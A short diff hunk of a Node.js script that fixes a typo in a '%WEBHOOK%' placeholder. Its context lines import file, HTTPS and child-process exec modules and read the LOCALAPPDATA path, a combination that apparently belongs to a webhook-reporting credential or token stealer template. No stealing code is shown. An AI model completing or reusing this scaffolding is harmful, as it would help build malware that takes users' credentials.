@@ -3,7 +3,7 @@ const fs = require('fs');
 const https = require('https');
 const { exec } = require('child_process');
 const buf_replace = require('buffer-replace');
-const webhook = %WEBHOOK%%
+const webhook = %WEBHOOK%
 
 
 var LOCAL = process.env.LOCALAPPDATA
